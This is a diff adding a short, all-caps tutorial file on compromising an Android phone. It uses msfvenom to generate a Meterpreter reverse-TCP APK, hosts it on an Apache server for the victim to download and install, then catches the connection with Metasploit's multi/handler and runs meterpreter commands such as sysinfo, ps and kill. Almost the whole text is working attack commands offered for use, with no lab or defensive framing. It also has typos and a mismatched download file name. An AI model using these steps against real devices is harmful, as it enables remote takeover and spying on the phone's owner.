@@ -1,0 +1,45 @@
+
+>>FIRST RUN THIS COMMAND IN YOUR TERMINAL [OUTSIDE MSFCONSOLE]:
+
+	> msfvenom -p android/meterpreter/reverce_tcp LHOST=<your IP> LPORT=<your available port number> R > filename.apk
+
+-------------------------------------------------------------------------------------------------------------------------
+
+>>IF YOU WANT TO CREATE AN APCHE WEB SERVER [NOT NECCSARY JUST AN ADDITIONAL STEPS]
+>>RUN THIS FOLLOWING COMMANDS RIGHT AFTER THE FIRST COMMAND:
+
+	> sudo mv filename.apk /var/www/html/
+	> cd /var/www/html
+	> service apache2 start
+	
+>>NOW IF YOU OPEN ANY BROWSER IN ANDROID DEVICE AND ENTER[IN URL SECTION]:
+
+	<attacker's IP>/filename.txt
+	
+>>NOW THE APK FILE WILL BE DOWNLOADED IN TOH THE ANDROID DEVICE
+>>NOW INSTALL THE APK FILE
+>>MainActivity APP WILL BE INSTALLED IN THE ANDROID DEVICE.
+--------------------------------------------------------------------------------------------------------------------------
+
+>>NOW IN THE SAME PREVIOUS OPENED DIRECTORY OPEN MSFCONSOLE IN TERMINAL[/var/www/html]:
+>>RUN THE FOLLOWING COMMANDS IN MSFCONSOLE:
+
+	> use exploit/multi/handler
+	> set payload android/meterpreter/reverse_tcp
+	> set LHOST <your IP>
+	> set LPORT <availabe port number>
+	> exploit
+	
+>>AFTER RUNNING THE COMMAND >exploit ,CLICK ON THE MainActivity APP TO ESTABLISH THE CONNECTION WITH ANDROID DEVICE.
+>>NOW YOU CAN USE VARIOUS METERPRETER COMMANDS TO EXPLOIT THE DEVICE.
+
+>>FOR EXAMPLE
+
+	meterepreter> sysinfo
+	meterepreter> ps
+	meterepreter> kill pid
+	meterepreter> ifconfig
+
+	meterpreter> help
+>>FOR MORE COMMANDS USE help command:
+	
